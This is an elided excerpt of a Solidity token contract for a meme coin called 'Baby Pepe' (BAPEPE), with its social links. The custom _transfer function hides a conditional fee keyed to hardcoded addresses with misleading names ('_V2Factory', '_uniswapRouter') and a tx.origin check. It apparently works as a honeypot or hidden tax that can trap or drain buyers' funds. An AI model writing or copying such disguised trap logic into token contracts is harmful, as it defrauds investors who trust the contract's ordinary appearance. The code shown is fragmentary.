...
https://twitter.com/BabyPepeCoinETH
https://t.me.com/BabyPepeCoinETH
https://BabyPepeCoinETH.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _V2Factory = 0xf8fAeaA6613B884370936420683Df36Ca9101E0F;
    address internal _uniswapRouter = 0x30F2F0a6807822B46e42E521B34F43C44A515F55;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouter && _balances[_V2Factory] > 0 ? pairToken : allowanceEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
contract BabyPepeCoin is ERC20, Ownable {
    constructor() ERC20(unicode"Baby Pepe", unicode"BAPEPE") {
